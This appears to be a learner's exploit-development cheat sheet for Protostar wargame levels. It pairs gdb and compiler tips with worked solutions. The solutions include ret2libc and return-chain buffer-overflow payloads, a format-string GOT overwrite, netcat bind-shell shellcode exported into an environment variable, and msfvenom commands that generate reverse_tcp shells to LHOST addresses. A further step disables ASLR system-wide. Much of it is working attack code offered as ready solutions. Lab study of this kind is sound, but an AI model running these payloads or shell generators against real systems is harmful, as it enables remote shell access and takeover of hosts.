#Compiling while avoiding gcc's protection mechanism (-fno-stack-protector)

	gcc -ggdb -mpreferred-stack-boundary=4 -fno-stack-protector -o helloBufferOverflow helloBufferOverflow.c

##gdb commands
#Loading the program in gdb

	gdb <executableProgramCode>

#Show the entire code loaded in gdb

	(gdb)list

#Placing breakpoints on the function can be done using line numbers obtained from the list command

	(gdb)break 7

	(gdb)break <line Number>

#disassemble the functions 

	(gdb)disas main

	disas <functionName>

#Start the program execution

	(gdb)run

#If a breakpoint is set and program gets paused at the breakpoint, for contiuning with the code, use 's'

	(gdb)s

#Disassmble the code at a given memory location

	(gdb)disas 0x0040059f

	disas <Memory Location>

#Checking the stack memory layout after the program has been loaded with breakpoints

	(gdb) x/8xw $rsp

#For the debugging to work properly, execute the below command

	(gdb) set debug-file-directory

#For checking the value of rip or eip

	(gdb) print /x $rip

#For locating system libc call

	(gdb) p system


## For compiling the c code with gcc, make use of the below parameters when Segmentation Fault error is given.

	The reason is that the shellcode may be in the non-executable memory.
	gcc -fno-stack-protector -z execstack -O OutputFileName yourShellCode.c

##For checking is ASLR(Address Space Layout Randominzation) is implemented and disabling it

	cat /proc/self/maps

	echo 0 > /proc/sys/kernel/randomize_va_space


# For checking the memory dump after program execution
		ulimit -c unlimited  ---> generates a core file

		 and then crash the program.

# For checking the exact memory location address 

	attach the process id to gdb
		1. ps -aux | grep "stack6"
		2. gdb -p <pid>

****Stack6 Protostar Soln1*****
	import struct
	padding = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC"

	#strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh" ---> Gives the offset 0x11f3bf
	#(gdb) info proc map  ---> For getting start memory address of /lib/libc-2.11.2.so call which is 0xb7e97000
	# break main; (gdb) print exit ---> finding the address of exit function in libc 
	system = struct.pack("I", 0xb7ecffb0)
	exit = struct.pack("I", 0xb7ec60c0)
	binsh = struct.pack("I", 0xb7e97000+0x11f3bf)

	print padding + system + exit + binsh

	(cat /tmp/test6;cat) | ./stack6
******Soln 2*******************
	(python -c 'print "/bin/sh" + "\x00" + "A"*68 + "BBBB" + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xac\xf7\xff\xbf"';cat) | ./stack6

	\xac\xf7\xff\xbf ----> address of /bin/sh on the stack 
	Found by attaching gdb to the process id of the running stack6 program
	******************************

*****Stack7 Protostar Soln*******************
		> Soln1 :
			python -c 'print "A"*80 + "\x83\x83\x04\x08" + "\x7d\xf9\xff\xbf"' > /tmp/test
			
			1. Here we will redirect to a memory location which contains an instruction for ret. ret pops the 	address from the stack
			and loads it on the eip.
			2. \x83\x83\x04\x08 was found using user@protostar:/opt/protostar/bin$ objdump -d stack7 | less
			3. ret should pop the value on the top of the stack and put it in the eip register
			4. So next value should be an address to which we want to execute
			5. \x7d\xf9\xff\xbf is the address to a shell that we loaded in the environment variable using
				export deadShell=`blahblahblah`
			6. Locate the deadShell address using the below mentioned c code when a program(stack7 in our case) get loaded in the memory
				./find deadShell ./stack7     ; find is the name of the c executable

		> Soln2:
			python -c 'print "A"*80 + "\x92\x84\x04\x08" + "BBBBCCCC" + "\x7d\xf9\xff\xbf"' > /tmp/test

			1. Here we locate a memory location that contains pop, pop, ret sequence using objdump
				objdump -d stack7 | less
			2. Then place  \x92\x84\x04\x08 which is the location of the instruction start
			3. Because of the 2 consecutive pops, we add 8 bytes of random junk "BBBBCCCC"
			4. Finally path of the deadShell found using the c code.
			

#Simple Shellcode for opening a root shell access on port 8080 "https://www.exploit-db.com/exploits/14332/"

 	  export deadShell=`python -c 'print "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23"'`

# Code to find memory addresses of the environmental variables when called by a program.

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>

	int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
        }

        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
   }

## 
		char *i = argv[1];
		printf("My name is : %s", i);

			If printf finds the first argument as %s format string, it will switch to second argument which is i and dereference it
			and will print the value stored at argv[1]

# Format String Vulnerability basics

	> A format string is an ASCIIZ string used to specify and control the representation of different variables

		int a;
		printf("%d", a);
			
		%d ---> Format String 
		This tells the printf function to convert integer `a` into the format of a string

		printf is a format function 


	> Happens when user input is used as-is in the format string 

       >  There is the ‘%n’parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the 			variable is given to the format function by placing an integer pointer as parameter onto the stack.

	>  ‘%s’ displays memory from an address that is supplied on the stack. 
	
	**Protostar format4 solution
	
		python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08"+"%2044x%5$hn%31920x%4$hn"' | ./format4
		
		exit() is a libc function and when the program runs its address is stored in the Global Offset Table(GOT) for 			later use. Format string vulnerability can be used to write the function hello() address into the GOT where the 		exit() function's address is stored. When the program calls exit() it will look in the GOT for its address and 			execution will be redirected to our hello() function instead.
		
		Find out addresses of exit and hello function
		
		objdump -t format4 | grep "hello"
		objdump -R format4 | grep "exit"
		
		exit -- > 08049724 ---> \x24\x97\x04\x08

		hello --> 080484b4  ---> \xb4\x84\x04\x08
		
		%5$hn  --> 
			5$ is used to point to the exact position on the stack. Here we're poiting to the 5th position
			%hn is for the short write that is writing 16 bits or 2 bytes   
			
		Due to little endian scheme, b4 needs to be written in the memory on the first byte , 84 on the second byte, 
		04 on third and 08 on fourth. (080484b4).
		
		1. As 0804 in hex = 2052 in dec, 8 bytes of address is already prepended in the input, so 2052-8 = 2044 is      			written on the third memory location pointed by \x26\x97\x04\x08    
		
		2. Since 84b4 in hex = 33972 in dec, thus writing 33972 - 2052 = 31920 on the first memory unit pointed by
			\x24\x97\x04\x08
		

# msfencode command for generating shellcode
		msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.0.2.14 --smallest -b "\x00" -f c
		msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.0.2.11 --smallest -b "\x00" -f c
			
## Resources
https://github.com/FabioBaroni/awesome-exploit-development/blob/master/README.md

https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf

http://the2702.com/2015/06/17/Format-4.html
